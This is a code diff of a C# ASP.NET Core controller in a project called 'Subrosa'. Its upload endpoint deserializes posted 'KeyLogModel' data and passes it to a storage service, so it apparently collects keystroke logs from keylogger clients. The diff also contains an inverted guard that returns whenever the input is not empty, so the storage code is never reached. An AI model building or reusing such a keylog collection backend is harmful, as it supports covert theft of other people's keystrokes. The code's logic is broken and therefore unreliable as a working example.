@@ -1,10 +1,8 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Threading.Tasks;
 using Microsoft.AspNetCore.Mvc;
 using Newtonsoft.Json;
 using Subrosa.Models;
+using Subrosa.Storage;
 
 namespace Subrosa.Api.Controllers
 {
@@ -12,14 +10,14 @@ namespace Subrosa.Api.Controllers
     public class UploadController : Controller
     {
         [HttpPost]
-        public void Post([FromBody]string value)
+        public void Post(string json)
         {
-            if (!String.IsNullOrWhiteSpace(value))
+            if (!String.IsNullOrWhiteSpace(json))
                 return;
 
-            KeyLogModel model = JsonConvert.DeserializeObject<KeyLogModel>(value);
-            
-
+            KeyLogModel model = JsonConvert.DeserializeObject<KeyLogModel>(json);
+            StorageService storageService = new StorageService();
+            storageService.StoreKeyLog(model);
         }
     }
 }
